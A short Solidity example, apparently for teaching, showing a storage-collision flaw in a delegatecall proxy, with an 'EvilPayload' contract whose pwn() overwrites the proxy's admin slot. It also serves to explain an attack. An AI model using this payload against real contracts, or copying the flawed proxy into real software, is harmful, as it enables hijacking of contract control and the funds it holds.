contract EvilPayload {
    // Overwrites proxy's admin/storage layout
    uint256 public dummy;
    address public attacker;

    function pwn() public {
        attacker = msg.sender;
    }
}
contract Proxy {
    address public impl;
    address public admin;

    function upgrade(address newImpl) public {
        require(msg.sender == admin, "Not admin");
        impl = newImpl;
    }

    fallback() external payable {
        (bool ok, ) = impl.delegatecall(msg.data); // ❌ attacker overwrites admin slot
        require(ok, "Fail");
    }
}
